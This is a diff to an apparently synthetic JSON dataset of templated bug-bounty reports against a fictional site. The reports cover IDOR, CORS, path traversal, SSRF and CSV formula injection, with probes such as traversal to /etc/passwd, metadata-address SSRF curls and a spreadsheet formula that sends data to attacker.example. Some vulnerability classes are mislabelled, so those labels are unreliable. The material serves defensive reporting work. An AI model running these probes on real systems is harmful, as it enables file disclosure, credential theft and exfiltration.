+      "description": "User-provided content is persisted and rendered via an unsafe primitive in an admin-facing view, leading to JavaScript execution in a privileged context.\n\n### Technical analysis\n- Vulnerability class: **Security Misconfiguration**\n- Affected target: `https://api.felsentor-watchworks.foo/admin/queue`\n- Preconditions: authenticated user: admin; app version: API v2\n\n```bash\n# Example probe\ncurl -i https://victim.example/endpoint\n```\n\n### Why this is a security issue\nThe behavior allows an attacker to influence a security-sensitive operation, leading to confidentiality, integrity, or availability impact beyond intended access controls.\n\n### Exploitation details\n- Create object with payload in a display field (e.g., subject/memo).\n- Open the admin list/detail view and observe execution.\n\n### Recommendations\n- Validate and sanitize all user-controlled inputs.\n- Enforce allowlists and strict server-side validation.\n- Apply least-privilege and defense-in-depth (CSP, output encoding, parameterized APIs).\n"
     },
     "triager": {
       "status": "accepted",
@@ -14463,7 +14572,8 @@
           "offset": "1d 5h",
           "message": "Provided HAR with response headers and CSP for reference."
         }
-      ]
+      ],
+      "description": "The download endpoint authorizes by session only and does not verify ownership, allowing enumeration of other users' resources.\n\n### Technical analysis\n- Vulnerability class: **Insecure Direct Object Reference (IDOR)**\n- Affected target: `https://api.felsentor-watchworks.foo/statements/`\n- Preconditions: authenticated user: admin; app version: Service 1.8\n\n```http\nGET /api/files/12345 HTTP/1.1\nHost: victim.example\nCookie: session=...\n```\n\n### Why this is a security issue\nThe behavior allows an attacker to influence a security-sensitive operation, leading to confidentiality, integrity, or availability impact beyond intended access controls.\n\n### Exploitation details\n- Request your own resource by ID.\n- Increment/decrement ID and observe cross-account access.\n\n### Recommendations\n- Authorize by object ownership on every read/write.\n- Use opaque identifiers; avoid incremental IDs.\n"
     },
     "triager": {
       "status": "accepted",
@@ -14574,7 +14684,8 @@
           "offset": "4d 5h",
           "message": "Included additional payload variant covering alternate render path."
         }
-      ]
+      ],
+      "description": "The API returns Access-Control-Allow-Origin: * with Access-Control-Allow-Credentials: true, allowing any origin to read responses with cookies.\n\n### Technical analysis\n- Vulnerability class: **Misconfigured CORS**\n- Affected target: `https://shop.felsentor-watchworks.foo/v2/me`\n- Preconditions: authenticated user: support agent; app version: Mobile 2025.09\n\n```http\nHTTP/1.1 200 OK\nAccess-Control-Allow-Origin: *\nAccess-Control-Allow-Credentials: true\n```\n\n### Why this is a security issue\nThe behavior allows an attacker to influence a security-sensitive operation, leading to confidentiality, integrity, or availability impact beyond intended access controls.\n\n### Exploitation details\n- Host malicious page and fetch protected endpoint with credentials.\n- Observe successful JSON read in attacker origin.\n\n### Recommendations\n- Do not combine `Access-Control-Allow-Origin: *` with credentials.\n- Reflect only allowlisted origins; disable credentials unless necessary.\n"
     },
     "triager": {
       "status": "accepted",
@@ -14713,7 +14824,8 @@
           "offset": "4d 12h",
           "message": "Provided list of affected endpoints discovered during retest."
         }
-      ]
+      ],
+      "description": "The API returns Access-Control-Allow-Origin: * with Access-Control-Allow-Credentials: true, allowing any origin to read responses with cookies.\n\n### Technical analysis\n- Vulnerability class: **Misconfigured CORS**\n- Affected target: `https://shop.felsentor-watchworks.foo/profile`\n- Preconditions: authenticated user: authenticated user; app version: Web 2025.09\n\n```http\nHTTP/1.1 200 OK\nAccess-Control-Allow-Origin: *\nAccess-Control-Allow-Credentials: true\n```\n\n### Why this is a security issue\nThe behavior allows an attacker to influence a security-sensitive operation, leading to confidentiality, integrity, or availability impact beyond intended access controls.\n\n### Exploitation details\n- Host malicious page and fetch protected endpoint with credentials.\n- Observe successful JSON read in attacker origin.\n\n### Recommendations\n- Do not combine `Access-Control-Allow-Origin: *` with credentials.\n- Reflect only allowlisted origins; disable credentials unless necessary.\n"
     },
     "triager": {
       "status": "accepted",
@@ -14816,7 +14928,8 @@
           "offset": "2d 7h",
           "message": "Provided list of affected endpoints discovered during retest."
         }
-      ]
+      ],
+      "description": "A filename parameter is concatenated into a path without proper normalization, allowing traversal to system files.\n\n### Technical analysis\n- Vulnerability class: **Path Traversal**\n- Affected target: `https://shop.felsentor-watchworks.foo/support/logs?file=../../../../etc/passwd`\n- Preconditions: authenticated user: admin; app version: API 2.3\n\n```bash\n# Accessing /etc/passwd via traversal\ncurl 'https://example/download?file=../../../../etc/passwd'\n```\n\n### Why this is a security issue\nThe behavior allows an attacker to influence a security-sensitive operation, leading to confidentiality, integrity, or availability impact beyond intended access controls.\n\n### Exploitation details\n- Request with file parameter using ../ traversal to system file.\n- Observe returned file content.\n\n### Recommendations\n- Normalize paths; reject `..` and absolute paths.\n- Enforce rooted directories and access checks by owner.\n- Use safe file APIs; avoid string concatenation.\n"
     },
     "triager": {
       "status": "accepted",
@@ -14956,7 +15069,8 @@
           "offset": "2d 9h",
           "message": "Shared minimal HTML page to demonstrate issue reliably."
         }
-      ]
+      ],
+      "description": "User-provided content is persisted and rendered via an unsafe primitive in an admin-facing view, leading to JavaScript execution in a privileged context.\n\n### Technical analysis\n- Vulnerability class: **Security Misconfiguration**\n- Affected target: `https://auth.felsentor-watchworks.foo/console/queue`\n- Preconditions: authenticated user: authenticated user; app version: Auth 2025.09\n\n```bash\n# Example probe\ncurl -i https://victim.example/endpoint\n```\n\n### Why this is a security issue\nThe behavior allows an attacker to influence a security-sensitive operation, leading to confidentiality, integrity, or availability impact beyond intended access controls.\n\n### Exploitation details\n- Create object with payload in a display field (e.g., subject/memo).\n- Open the admin list/detail view and observe execution.\n\n### Recommendations\n- Validate and sanitize all user-controlled inputs.\n- Enforce allowlists and strict server-side validation.\n- Apply least-privilege and defense-in-depth (CSP, output encoding, parameterized APIs).\n"
     },
     "triager": {
       "status": "accepted",
@@ -15044,7 +15158,8 @@
           "offset": "5d 11h",
           "message": "Confirmed behavior on latest build; attaching version string."
         }
-      ]
+      ],
+      "description": "A filename parameter is concatenated into a path without proper normalization, allowing traversal to system files.\n\n### Technical analysis\n- Vulnerability class: **Path Traversal**\n- Affected target: `https://auth.felsentor-watchworks.foo/support/logs?file=../../../../etc/passwd`\n- Preconditions: authenticated user: unauthenticated; app version: Web 2025.09\n\n```bash\n# Accessing /etc/passwd via traversal\ncurl 'https://example/download?file=../../../../etc/passwd'\n```\n\n### Why this is a security issue\nThe behavior allows an attacker to influence a security-sensitive operation, leading to confidentiality, integrity, or availability impact beyond intended access controls.\n\n### Exploitation details\n- Request with file parameter using ../ traversal to system file.\n- Observe returned file content.\n\n### Recommendations\n- Normalize paths; reject `..` and absolute paths.\n- Enforce rooted directories and access checks by owner.\n- Use safe file APIs; avoid string concatenation.\n"
     },
     "triager": {
       "status": "accepted",
@@ -15195,7 +15310,8 @@
           "offset": "3d 2h",
           "message": "Shared curl one-liner to help reproduce quickly."
         }
-      ]
+      ],
+      "description": "The download endpoint authorizes by session only and does not verify ownership, allowing enumeration of other users' resources.\n\n### Technical analysis\n- Vulnerability class: **Insecure Direct Object Reference (IDOR)**\n- Affected target: `https://auth.felsentor-watchworks.foo/statements/`\n- Preconditions: authenticated user: support agent; app version: Auth 2025.09\n\n```http\nGET /api/files/12345 HTTP/1.1\nHost: victim.example\nCookie: session=...\n```\n\n### Why this is a security issue\nThe behavior allows an attacker to influence a security-sensitive operation, leading to confidentiality, integrity, or availability impact beyond intended access controls.\n\n### Exploitation details\n- Request your own resource by ID.\n- Increment/decrement ID and observe cross-account access.\n\n### Recommendations\n- Authorize by object ownership on every read/write.\n- Use opaque identifiers; avoid incremental IDs.\n"
     },
     "triager": {
       "status": "accepted",
@@ -15328,7 +15444,8 @@
           "offset": "4d 23h",
           "message": "Shared minimal HTML page to demonstrate issue reliably."
         }
-      ]
+      ],
+      "description": "The /metrics endpoint is publicly accessible and includes identifiers in labels, exposing sensitive metadata.\n\n### Technical analysis\n- Vulnerability class: **Server-Side Request Forgery (SSRF)**\n- Affected target: `https://api.felsentor-watchworks.foo/metrics`\n- Preconditions: authenticated user: citizen; app version: Web 2025.09\n\n```bash\n# Demonstrative SSRF curl\ncurl -s 'https://api.example/foo?url=http://169.254.169.254/latest/meta-data/hostname'\n```\n\n### Why this is a security issue\nThe behavior allows an attacker to influence a security-sensitive operation, leading to confidentiality, integrity, or availability impact beyond intended access controls.\n\n### Exploitation details\n- GET /metrics and observe labels with identifiers.\n\n### Recommendations\n- Enforce URL allowlists; block private and metadata ranges.\n- Resolve DNS server-side; use egress allowlists.\n- Use protocol allowlists (http/https only), size/timeouts.\n"
     },
     "triager": {
       "status": "accepted",
@@ -15476,7 +15593,8 @@
           "offset": "0h",
           "message": "Initial submission with PoC and reproduction steps."
         }
-      ]
+      ],
+      "description": "The API returns Access-Control-Allow-Origin: * with Access-Control-Allow-Credentials: true, allowing any origin to read responses with cookies.\n\n### Technical analysis\n- Vulnerability class: **Misconfigured CORS**\n- Affected target: `https://api.felsentor-watchworks.foo/profile`\n- Preconditions: authenticated user: radiologist; app version: Web 2025.09\n\n```http\nHTTP/1.1 200 OK\nAccess-Control-Allow-Origin: *\nAccess-Control-Allow-Credentials: true\n```\n\n### Why this is a security issue\nThe behavior allows an attacker to influence a security-sensitive operation, leading to confidentiality, integrity, or availability impact beyond intended access controls.\n\n### Exploitation details\n- Host malicious page and fetch protected endpoint with credentials.\n- Observe successful JSON read in attacker origin.\n\n### Recommendations\n- Do not combine `Access-Control-Allow-Origin: *` with credentials.\n- Reflect only allowlisted origins; disable credentials unless necessary.\n"
     },
     "triager": {
       "status": "accepted",
@@ -15639,7 +15757,8 @@
           "offset": "5d 2h",
           "message": "Included additional payload variant covering alternate render path."
         }
-      ]
+      ],
+      "description": "A filename parameter is concatenated into a path without proper normalization, allowing traversal to system files.\n\n### Technical analysis\n- Vulnerability class: **Path Traversal**\n- Affected target: `https://api.felsentor-watchworks.foo/logs?file=../../../../etc/passwd`\n- Preconditions: authenticated user: citizen; app version: Web 2025.09\n\n```bash\n# Accessing /etc/passwd via traversal\ncurl 'https://example/download?file=../../../../etc/passwd'\n```\n\n### Why this is a security issue\nThe behavior allows an attacker to influence a security-sensitive operation, leading to confidentiality, integrity, or availability impact beyond intended access controls.\n\n### Exploitation details\n- Request with file parameter using ../ traversal to system file.\n- Observe returned file content.\n\n### Recommendations\n- Normalize paths; reject `..` and absolute paths.\n- Enforce rooted directories and access checks by owner.\n- Use safe file APIs; avoid string concatenation.\n"
     },
     "triager": {
       "status": "accepted",
@@ -15795,7 +15914,8 @@
           "offset": "19h",
           "message": "Uploaded redacted logs illustrating server-side trace."
         }
-      ]
+      ],
+      "description": "The download endpoint authorizes by session only and does not verify ownership, allowing enumeration of other users' resources.\n\n### Technical analysis\n- Vulnerability class: **Insecure Direct Object Reference (IDOR)**\n- Affected target: `https://auth.felsentor-watchworks.foo/api/documents/`\n- Preconditions: authenticated user: support agent; app version: Service 1.8\n\n```http\nGET /api/files/12345 HTTP/1.1\nHost: victim.example\nCookie: session=...\n```\n\n### Why this is a security issue\nThe behavior allows an attacker to influence a security-sensitive operation, leading to confidentiality, integrity, or availability impact beyond intended access controls.\n\n### Exploitation details\n- Request your own resource by ID.\n- Increment/decrement ID and observe cross-account access.\n\n### Recommendations\n- Authorize by object ownership on every read/write.\n- Use opaque identifiers; avoid incremental IDs.\n"
     },
     "triager": {
       "status": "accepted",
@@ -15958,7 +16078,8 @@
           "offset": "6d 19h",
           "message": "Included additional payload variant covering alternate render path."
         }
-      ]
+      ],
+      "description": "User-provided content is persisted and rendered via an unsafe primitive in an admin-facing view, leading to JavaScript execution in a privileged context.\n\n### Technical analysis\n- Vulnerability class: **Security Misconfiguration**\n- Affected target: `https://auth.felsentor-watchworks.foo/admin/items`\n- Preconditions: authenticated user: support agent; app version: Portal 2025.09\n\n```bash\n# Example probe\ncurl -i https://victim.example/endpoint\n```\n\n### Why this is a security issue\nThe behavior allows an attacker to influence a security-sensitive operation, leading to confidentiality, integrity, or availability impact beyond intended access controls.\n\n### Exploitation details\n- Create object with payload in a display field (e.g., subject/memo).\n- Open the admin list/detail view and observe execution.\n\n### Recommendations\n- Validate and sanitize all user-controlled inputs.\n- Enforce allowlists and strict server-side validation.\n- Apply least-privilege and defense-in-depth (CSP, output encoding, parameterized APIs).\n"
     },
     "triager": {
       "status": "accepted",
@@ -16089,7 +16210,8 @@
           "offset": "0h",
           "message": "Minimal PoC attached; scope limited to in-scope assets."
         }
-      ]
+      ],
+      "description": "The download endpoint authorizes by session only and does not verify ownership, allowing enumeration of other users' resources.\n\n### Technical analysis\n- Vulnerability class: **Insecure Direct Object Reference (IDOR)**\n- Affected target: `https://auth.felsentor-watchworks.foo/statements/`\n- Preconditions: authenticated user: authenticated user; app version: API v2\n\n```http\nGET /api/files/12345 HTTP/1.1\nHost: victim.example\nCookie: session=...\n```\n\n### Why this is a security issue\nThe behavior allows an attacker to influence a security-sensitive operation, leading to confidentiality, integrity, or availability impact beyond intended access controls.\n\n### Exploitation details\n- Request your own resource by ID.\n- Increment/decrement ID and observe cross-account access.\n\n### Recommendations\n- Authorize by object ownership on every read/write.\n- Use opaque identifiers; avoid incremental IDs.\n"
     },
     "triager": {
       "status": "accepted",
@@ -16249,7 +16371,8 @@
           "offset": "7d 8h",
           "message": "Shared curl one-liner to help reproduce quickly."
         }
-      ]
+      ],
+      "description": "A server-side fetch accepts attacker-controlled URLs without allowlist or private range blocking, enabling access to internal metadata/services.\n\n### Technical analysis\n- Vulnerability class: **Server-Side Request Forgery (SSRF)**\n- Affected target: `https://auth.felsentor-watchworks.foo/import`\n- Preconditions: authenticated user: authenticated user; app version: Console 2025.09\n\n```bash\n# Demonstrative SSRF curl\ncurl -s 'https://api.example/foo?url=http://169.254.169.254/latest/meta-data/hostname'\n```\n\n### Why this is a security issue\nThe behavior allows an attacker to influence a security-sensitive operation, leading to confidentiality, integrity, or availability impact beyond intended access controls.\n\n### Exploitation details\n- POST url=http://169.254.169.254/latest/meta-data/ to the import endpoint.\n- Observe internal metadata persisted in the created resource.\n\n### Recommendations\n- Enforce URL allowlists; block private and metadata ranges.\n- Resolve DNS server-side; use egress allowlists.\n- Use protocol allowlists (http/https only), size/timeouts.\n"
     },
     "triager": {
       "status": "accepted",
@@ -16339,7 +16462,8 @@
           "offset": "2d 20h",
           "message": "Added sanitized PoC variant to avoid external calls."
         }
-      ]
+      ],
+      "description": "The API returns Access-Control-Allow-Origin: * with Access-Control-Allow-Credentials: true, allowing any origin to read responses with cookies.\n\n### Technical analysis\n- Vulnerability class: **Misconfigured CORS**\n- Affected target: `https://shop.felsentor-watchworks.foo/profile`\n- Preconditions: authenticated user: unauthenticated; app version: Mobile 2025.09\n\n```http\nHTTP/1.1 200 OK\nAccess-Control-Allow-Origin: *\nAccess-Control-Allow-Credentials: true\n```\n\n### Why this is a security issue\nThe behavior allows an attacker to influence a security-sensitive operation, leading to confidentiality, integrity, or availability impact beyond intended access controls.\n\n### Exploitation details\n- Host malicious page and fetch protected endpoint with credentials.\n- Observe successful JSON read in attacker origin.\n\n### Recommendations\n- Do not combine `Access-Control-Allow-Origin: *` with credentials.\n- Reflect only allowlisted origins; disable credentials unless necessary.\n"
     },
     "triager": {
       "status": "accepted",
@@ -16490,7 +16614,8 @@
           "offset": "7d 1h",
           "message": "Provided list of affected endpoints discovered during retest."
         }
-      ]
+      ],
+      "description": "User-provided content is persisted and rendered via an unsafe primitive in an admin-facing view, leading to JavaScript execution in a privileged context.\n\n### Technical analysis\n- Vulnerability class: **Security Misconfiguration**\n- Affected target: `https://shop.felsentor-watchworks.foo/admin/queue`\n- Preconditions: authenticated user: radiologist; app version: Service 1.8\n\n```bash\n# Example probe\ncurl -i https://victim.example/endpoint\n```\n\n### Why this is a security issue\nThe behavior allows an attacker to influence a security-sensitive operation, leading to confidentiality, integrity, or availability impact beyond intended access controls.\n\n### Exploitation details\n- Create object with payload in a display field (e.g., subject/memo).\n- Open the admin list/detail view and observe execution.\n\n### Recommendations\n- Validate and sanitize all user-controlled inputs.\n- Enforce allowlists and strict server-side validation.\n- Apply least-privilege and defense-in-depth (CSP, output encoding, parameterized APIs).\n"
     },
     "triager": {
       "status": "accepted",
@@ -16585,7 +16710,8 @@
           "offset": "0h",
           "message": "Initial submission with PoC and reproduction steps."
         }
-      ]
+      ],
+      "description": "The API returns Access-Control-Allow-Origin: * with Access-Control-Allow-Credentials: true, allowing any origin to read responses with cookies.\n\n### Technical analysis\n- Vulnerability class: **Misconfigured CORS**\n- Affected target: `https://auth.felsentor-watchworks.foo/v2/me`\n- Preconditions: authenticated user: citizen; app version: Auth 2025.09\n\n```http\nHTTP/1.1 200 OK\nAccess-Control-Allow-Origin: *\nAccess-Control-Allow-Credentials: true\n```\n\n### Why this is a security issue\nThe behavior allows an attacker to influence a security-sensitive operation, leading to confidentiality, integrity, or availability impact beyond intended access controls.\n\n### Exploitation details\n- Host malicious page and fetch protected endpoint with credentials.\n- Observe successful JSON read in attacker origin.\n\n### Recommendations\n- Do not combine `Access-Control-Allow-Origin: *` with credentials.\n- Reflect only allowlisted origins; disable credentials unless necessary.\n"
     },
     "triager": {
       "status": "accepted",
@@ -16753,7 +16879,8 @@
           "offset": "8d 19h",
           "message": "Included additional payload variant covering alternate render path."
         }
-      ]
+      ],
+      "description": "The download endpoint authorizes by session only and does not verify ownership, allowing enumeration of other users' resources.\n\n### Technical analysis\n- Vulnerability class: **Insecure Direct Object Reference (IDOR)**\n- Affected target: `https://www.felsentor-watchworks.foo/statements/`\n- Preconditions: authenticated user: support agent; app version: Portal 2025.09\n\n```http\nGET /api/files/12345 HTTP/1.1\nHost: victim.example\nCookie: session=...\n```\n\n### Why this is a security issue\nThe behavior allows an attacker to influence a security-sensitive operation, leading to confidentiality, integrity, or availability impact beyond intended access controls.\n\n### Exploitation details\n- Request your own resource by ID.\n- Increment/decrement ID and observe cross-account access.\n\n### Recommendations\n- Authorize by object ownership on every read/write.\n- Use opaque identifiers; avoid incremental IDs.\n"
     },
     "triager": {
       "status": "accepted",
@@ -16901,7 +17028,8 @@
           "offset": "7d 10h",
           "message": "Provided HAR with response headers and CSP for reference."
         }
-      ]
+      ],
+      "description": "CSV export writes unescaped values; cells starting with =,+,-,@ are treated as formulas by spreadsheet apps, enabling exfiltration when opened.\n\n### Technical analysis\n- Vulnerability class: **CSV Formula Injection**\n- Affected target: `https://www.felsentor-watchworks.foo/export?type=records`\n- Preconditions: authenticated user: authenticated user; app version: Web 2025.09\n\n```csv\n=HYPERLINK(\"https://attacker.example/?c=\"&ENCODEURL(A1))\n```\n\n### Why this is a security issue\nThe behavior allows an attacker to influence a security-sensitive operation, leading to confidentiality, integrity, or availability impact beyond intended access controls.\n\n### Exploitation details\n- Create a record with a field value beginning with a formula string.\n- Export CSV and open in Excel/LibreOffice; observe formula execution.\n\n### Recommendations\n- Prefix cells starting with `=,+,-,@` with a single quote.\n- Export CSV as text-safe or use TSV.\n"
     },
     "triager": {
       "status": "accepted",
@@ -17033,7 +17161,8 @@
           "offset": "2d 4h",
           "message": "Provided HAR with response headers and CSP for reference."
         }
-      ]
+      ],
+      "description": "The API returns Access-Control-Allow-Origin: * with Access-Control-Allow-Credentials: true, allowing any origin to read responses with cookies.\n\n### Technical analysis\n- Vulnerability class: **Misconfigured CORS**\n- Affected target: `https://www.felsentor-watchworks.foo/v2/me`\n- Preconditions: authenticated user: radiologist; app version: Mobile 2025.09\n\n```http\nHTTP/1.1 200 OK\nAccess-Control-Allow-Origin: *\nAccess-Control-Allow-Credentials: true\n```\n\n### Why this is a security issue\nThe behavior allows an attacker to influence a security-sensitive operation, leading to confidentiality, integrity, or availability impact beyond intended access controls.\n\n### Exploitation details\n- Host malicious page and fetch protected endpoint with credentials.\n- Observe successful JSON read in attacker origin.\n\n### Recommendations\n- Do not combine `Access-Control-Allow-Origin: *` with credentials.\n- Reflect only allowlisted origins; disable credentials unless necessary.\n"
     },
     "triager": {
       "status": "accepted",
@@ -17169,7 +17298,8 @@
           "offset": "3d 6h",
           "message": "Provided list of affected endpoints discovered during retest."
         }
-      ]
+      ],
+      "description": "The download endpoint authorizes by session only and does not verify ownership, allowing enumeration of other users' resources.\n\n### Technical analysis\n- Vulnerability class: **Insecure Direct Object Reference (IDOR)**\n- Affected target: `https://auth.felsentor-watchworks.foo/statements/`\n- Preconditions: authenticated user: unauthenticated; app version: Portal 2025.09\n\n```http\nGET /api/files/12345 HTTP/1.1\nHost: victim.example\nCookie: session=...\n```\n\n### Why this is a security issue\nThe behavior allows an attacker to influence a security-sensitive operation, leading to confidentiality, integrity, or availability impact beyond intended access controls.\n\n### Exploitation details\n- Request your own resource by ID.\n- Increment/decrement ID and observe cross-account access.\n\n### Recommendations\n- Authorize by object ownership on every read/write.\n- Use opaque identifiers; avoid incremental IDs.\n"
     },
     "triager": {
       "status": "accepted",
@@ -17299,7 +17429,8 @@
           "offset": "1d",
           "message": "Provided list of affected endpoints discovered during retest."
         }
-      ]
+      ],
+      "description": "A filename parameter is concatenated into a path without proper normalization, allowing traversal to system files.\n\n### Technical analysis\n- Vulnerability class: **Path Traversal**\n- Affected target: `https://www.felsentor-watchworks.foo/logs?file=../../../../etc/passwd`\n- Preconditions: authenticated user: citizen; app version: Web 2025.09\n\n```bash\n# Accessing /etc/passwd via traversal\ncurl 'https://example/download?file=../../../../etc/passwd'\n```\n\n### Why this is a security issue\nThe behavior allows an attacker to influence a security-sensitive operation, leading to confidentiality, integrity, or availability impact beyond intended access controls.\n\n### Exploitation details\n- Request with file parameter using ../ traversal to system file.\n- Observe returned file content.\n\n### Recommendations\n- Normalize paths; reject `..` and absolute paths.\n- Enforce rooted directories and access checks by owner.\n- Use safe file APIs; avoid string concatenation.\n"
     },
     "triager": {
       "status": "accepted",
@@ -17431,7 +17562,8 @@
           "offset": "1d 9h",
           "message": "Verified fix in Firefox and Safari; Chrome previously tested."
         }
-      ]
+      ],
+      "description": "The download endpoint authorizes by session only and does not verify ownership, allowing enumeration of other users' resources.\n\n### Technical analysis\n- Vulnerability class: **Insecure Direct Object Reference (IDOR)**\n- Affected target: `https://auth.felsentor-watchworks.foo/api/documents/`\n- Preconditions: authenticated user: radiologist; app version: Service 1.8\n\n```http\nGET /api/files/12345 HTTP/1.1\nHost: victim.example\nCookie: session=...\n```\n\n### Why this is a security issue\nThe behavior allows an attacker to influence a security-sensitive operation, leading to confidentiality, integrity, or availability impact beyond intended access controls.\n\n### Exploitation details\n- Request your own resource by ID.\n- Increment/decrement ID and observe cross-account access.\n\n### Recommendations\n- Authorize by object ownership on every read/write.\n- Use opaque identifiers; avoid incremental IDs.\n"
     },
     "triager": {
       "status": "accepted",
@@ -17542,7 +17674,8 @@
           "offset": "1d 6h",
           "message": "Uploaded redacted logs illustrating server-side trace."
         }
-      ]
+      ],
+      "description": "The API returns Access-Control-Allow-Origin: * with Access-Control-Allow-Credentials: true, allowing any origin to read responses with cookies.\n\n### Technical analysis\n- Vulnerability class: **Misconfigured CORS**\n- Affected target: `https://www.felsentor-watchworks.foo/profile`\n- Preconditions: authenticated user: support agent; app version: Web 2025.09\n\n```http\nHTTP/1.1 200 OK\nAccess-Control-Allow-Origin: *\nAccess-Control-Allow-Credentials: true\n```\n\n### Why this is a security issue\nThe behavior allows an attacker to influence a security-sensitive operation, leading to confidentiality, integrity, or availability impact beyond intended access controls.\n\n### Exploitation details\n- Host malicious page and fetch protected endpoint with credentials.\n- Observe successful JSON read in attacker origin.\n\n### Recommendations\n- Do not combine `Access-Control-Allow-Origin: *` with credentials.\n- Reflect only allowlisted origins; disable credentials unless necessary.\n"
     },
     "triager": {
       "status": "accepted",
@@ -17689,7 +17822,8 @@
           "offset": "7d 11h",
           "message": "Shared curl one-liner to help reproduce quickly."
         }
-      ]
+      ],
+      "description": "A filename parameter is concatenated into a path without proper normalization, allowing traversal to system files.\n\n### Technical analysis\n- Vulnerability class: **Path Traversal**\n- Affected target: `https://www.felsentor-watchworks.foo/support/logs?file=../../../../etc/passwd`\n- Preconditions: authenticated user: radiologist; app version: API 2.3\n\n```bash\n# Accessing /etc/passwd via traversal\ncurl 'https://example/download?file=../../../../etc/passwd'\n```\n\n### Why this is a security issue\nThe behavior allows an attacker to influence a security-sensitive operation, leading to confidentiality, integrity, or availability impact beyond intended access controls.\n\n### Exploitation details\n- Request with file parameter using ../ traversal to system file.\n- Observe returned file content.\n\n### Recommendations\n- Normalize paths; reject `..` and absolute paths.\n- Enforce rooted directories and access checks by owner.\n- Use safe file APIs; avoid string concatenation.\n"
     },
     "triager": {
       "status": "accepted",
@@ -17831,7 +17965,8 @@
           "offset": "4d 3h",
           "message": "Shared curl one-liner to help reproduce quickly."
         }
-      ]
+      ],
+      "description": "The /metrics endpoint is publicly accessible and includes identifiers in labels, exposing sensitive metadata.\n\n### Technical analysis\n- Vulnerability class: **Server-Side Request Forgery (SSRF)**\n- Affected target: `https://www.felsentor-watchworks.foo/metrics`\n- Preconditions: authenticated user: admin; app version: Auth 2025.09\n\n```bash\n# Demonstrative SSRF curl\ncurl -s 'https://api.example/foo?url=http://169.254.169.254/latest/meta-data/hostname'\n```\n\n### Why this is a security issue\nThe behavior allows an attacker to influence a security-sensitive operation, leading to confidentiality, integrity, or availability impact beyond intended access controls.\n\n### Exploitation details\n- GET /metrics and observe labels with identifiers.\n\n### Recommendations\n- Enforce URL allowlists; block private and metadata ranges.\n- Resolve DNS server-side; use egress allowlists.\n- Use protocol allowlists (http/https only), size/timeouts.\n"
     },
     "triager": {
       "status": "accepted",
@@ -17917,7 +18052,8 @@
           "offset": "2d 22h",
           "message": "Shared minimal HTML page to demonstrate issue reliably."
         }
-      ]
+      ],
+      "description": "User-provided content is persisted and rendered via an unsafe primitive in an admin-facing view, leading to JavaScript execution in a privileged context.\n\n### Technical analysis\n- Vulnerability class: **Security Misconfiguration**\n- Affected target: `https://www.felsentor-watchworks.foo/console/queue`\n- Preconditions: authenticated user: radiologist; app version: Web 2025.09\n\n```bash\n# Example probe\ncurl -i https://victim.example/endpoint\n```\n\n### Why this is a security issue\nThe behavior allows an attacker to influence a security-sensitive operation, leading to confidentiality, integrity, or availability impact beyond intended access controls.\n\n### Exploitation details\n- Create object with payload in a display field (e.g., subject/memo).\n- Open the admin list/detail view and observe execution.\n\n### Recommendations\n- Validate and sanitize all user-controlled inputs.\n- Enforce allowlists and strict server-side validation.\n- Apply least-privilege and defense-in-depth (CSP, output encoding, parameterized APIs).\n"
     },
     "triager": {
       "status": "accepted",
@@ -18025,7 +18161,8 @@
           "offset": "1d 23h",
           "message": "Added sanitized PoC variant to avoid external calls."
         }
-      ]
+      ],
+      "description": "A server-side fetch accepts attacker-controlled URLs without allowlist or private range blocking, enabling access to internal metadata/services.\n\n### Technical analysis\n- Vulnerability class: **Server-Side Request Forgery (SSRF)**\n- Affected target: `https://auth.felsentor-watchworks.foo/import`\n- Preconditions: authenticated user: admin; app version: API v2\n\n```bash\n# Demonstrative SSRF curl\ncurl -s 'https://api.example/foo?url=http://169.254.169.254/latest/meta-data/hostname'\n```\n\n### Why this is a security issue\nThe behavior allows an attacker to influence a security-sensitive operation, leading to confidentiality, integrity, or availability impact beyond intended access controls.\n\n### Exploitation details\n- POST url=http://169.254.169.254/latest/meta-data/ to the import endpoint.\n- Observe internal metadata persisted in the created resource.\n\n### Recommendations\n- Enforce URL allowlists; block private and metadata ranges.\n- Resolve DNS server-side; use egress allowlists.\n- Use protocol allowlists (http/https only), size/timeouts.\n"
     },
     "triager": {
       "status": "accepted",
@@ -18153,7 +18290,8 @@
           "offset": "1d 23h",
           "message": "Shared curl one-liner to help reproduce quickly."
         }
-      ]
+      ],
+      "description": "The download endpoint authorizes by session only and does not verify ownership, allowing enumeration of other users' resources.\n\n### Technical analysis\n- Vulnerability class: **Insecure Direct Object Reference (IDOR)**\n- Affected target: `https://www.felsentor-watchworks.foo/api/documents/`\n- Preconditions: authenticated user: citizen; app version: Web 2025.09\n\n```http\nGET /api/files/12345 HTTP/1.1\nHost: victim.example\nCookie: session=...\n```\n\n### Why this is a security issue\nThe behavior allows an attacker to influence a security-sensitive operation, leading to confidentiality, integrity, or availability impact beyond intended access controls.\n\n### Exploitation details\n- Request your own resource by ID.\n- Increment/decrement ID and observe cross-account access.\n\n### Recommendations\n- Authorize by object ownership on every read/write.\n- Use opaque identifiers; avoid incremental IDs.\n"
     },
     "triager": {
       "status": "accepted",
@@ -18274,7 +18412,8 @@
           "offset": "4d 13h",
           "message": "Included additional payload variant covering alternate render path."
         }
-      ]
+      ],
+      "description": "A filename parameter is concatenated into a path without proper normalization, allowing traversal to system files.\n\n### Technical analysis\n- Vulnerability class: **Path Traversal**\n- Affected target: `https://auth.felsentor-watchworks.foo/support/logs?file=../../../../etc/passwd`\n- Preconditions: authenticated user: unauthenticated; app version: Auth 2025.09\n\n```bash\n# Accessing /etc/passwd via traversal\ncurl 'https://example/download?file=../../../../etc/passwd'\n```\n\n### Why this is a security issue\nThe behavior allows an attacker to influence a security-sensitive operation, leading to confidentiality, integrity, or availability impact beyond intended access controls.\n\n### Exploitation details\n- Request with file parameter using ../ traversal to system file.\n- Observe returned file content.\n\n### Recommendations\n- Normalize paths; reject `..` and absolute paths.\n- Enforce rooted directories and access checks by owner.\n- Use safe file APIs; avoid string concatenation.\n"
     },
     "triager": {
       "status": "accepted",
@@ -18414,7 +18553,8 @@
           "offset": "5d 16h",
           "message": "Re-tested on staging after patch; please confirm rollout window."
         }
-      ]
+      ],
